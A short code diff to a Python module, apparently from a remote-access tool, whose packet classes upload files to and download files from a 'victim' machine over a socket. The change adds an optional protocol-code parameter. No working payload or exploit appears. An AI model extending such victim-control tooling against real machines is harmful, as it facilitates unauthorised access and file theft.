@@ -12,7 +12,7 @@ The Packet class handle raw packets with a specific protocol code. The default c
 any other protocol code can be used. Respose protocol codes should only be used for the victim socket.
 
 The FileUploadPacket uses Packet as base class and handle a file upload to victim using the UPLOAD protocol
-code. The class make the upload much more easy, but there is no problem to use the Packet class to send 
+code. The class make the upload much more easy, but there is no problem to use the Packet class to send
 files through socket, since the correct protocol code is used.
 
 The FileDownloadPacket class also uses Packet as base class to handle a file download from victim pc.
@@ -52,7 +52,7 @@ class Packet(DataInterface):
         return protocol.build_packet(self._code, content=self._content, params=self._params)
 
 class FileUploadPacket(Packet):
-    def __init__(self, file, params={}):
+    def __init__(self, file, params={}, code=None):
         """
         Create a file packet to send files through socket.
         The default status code is the UPLOAD protocol code.
@@ -62,7 +62,7 @@ class FileUploadPacket(Packet):
         :return: The FileUploadPacket object.
         """
         self.file = file
-        Packet.__init__(self, content=self.__get_content(), params=self.__parse_params(params), code=protocol.UPLOAD)
+        Packet.__init__(self, content=self.__get_content(), params=self.__parse_params(params), code=code if code else protocol.UPLOAD)
 
     @property
     def params(self):
